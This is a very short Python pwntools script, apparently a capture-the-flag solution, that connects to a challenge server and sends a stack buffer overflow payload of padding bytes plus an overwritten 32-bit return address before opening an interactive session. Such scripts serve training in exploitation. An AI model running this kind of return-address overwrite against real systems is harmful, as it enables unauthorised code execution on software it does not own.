from pwn import *

# connect
conn = remote('chal.sigpwny.com', 1355)

#build payload
exploit = b'A' * 0x2c
exploit += p32(0x0804857b)

# send payload
conn.sendline(exploit)

conn.interactive()